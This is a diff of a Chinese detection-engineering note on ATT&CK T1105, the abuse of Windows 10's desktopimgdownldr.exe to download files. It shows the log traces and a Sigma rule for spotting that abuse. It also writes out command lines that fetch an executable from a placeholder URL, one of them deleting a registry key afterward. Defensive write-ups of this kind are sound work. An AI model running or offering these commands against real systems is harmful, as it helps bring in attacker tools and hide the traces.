@@ -5,19 +5,23 @@
 攻击者可能会将工具或其他文件从外部系统转移到被攻击的环境中。可以通过命令和控制通道从外部攻击者控制的系统复制文件，用以将工具带入被攻击的网络中，或通过其他工具（如 FTP）的替代协议。 也可以使用 scp、rsync 和 sftp等本地工具在Mac和 Linux上复制文件。
 
 ## 测试案例
+
 desktopimgdownldr.exe位于Win10的system32文件夹中，原本用于设置锁定屏幕或桌面背景图像的。
 
 **路径:**
+
 ```bash
 - c:\windows\system32\desktopimgdownldr.exe
 ```
 
 普通用户可以用以下命令来实现文件下载：
+
 ```bash
 set "SYSTEMROOT=C:\ProgramData" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://url/xxx.exe /eventName:desktopimgdownldr
 ```
 
 管理员会多写一个注册表项，所以管理员的命令如下：
+
 ```bash
 set "SYSTEMROOT=C:\ProgramData\" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://url/file.exe /eventName:desktopimgdownldr && reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP /f
 ```
@@ -25,6 +29,7 @@ set "SYSTEMROOT=C:\ProgramData\" && cmd /c desktopimgdownldr.exe /lockscreenurl:
 用例：从Web服务器下载任意文件
 所需权限：用户
 操作系统：Windows 10
+
 ## 检测日志
 
 windows安全日志
@@ -36,7 +41,8 @@ C:\Users\liyang\Desktop\asptest>set "SYSTEMROOT=C:\Windows\Temp" && cmd /c deskt
 ```
 
 ## 测试留痕
-```
+
+```yml
 已创建新进程。
 
   
@@ -81,8 +87,11 @@ C:\Users\liyang\Desktop\asptest>set "SYSTEMROOT=C:\Windows\Temp" && cmd /c deskt
 
 进程命令行: desktopimgdownldr.exe  /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
 ```
+
 ## 检测方法/思路
+
 参考Sigma官方规则:
+
 ```yml
 title: Suspicious Desktopimgdownldr Target File
 
@@ -152,7 +161,9 @@ level: high
 ```
 
 ### 建议
+
 从Sigma和elastic给出的规则来看，更多的是对进程和命令行参数进行监测，只要出现其中一个命令参数即告警。
+
 ## 参考推荐
 
 MITRE-ATT&CK-T1105
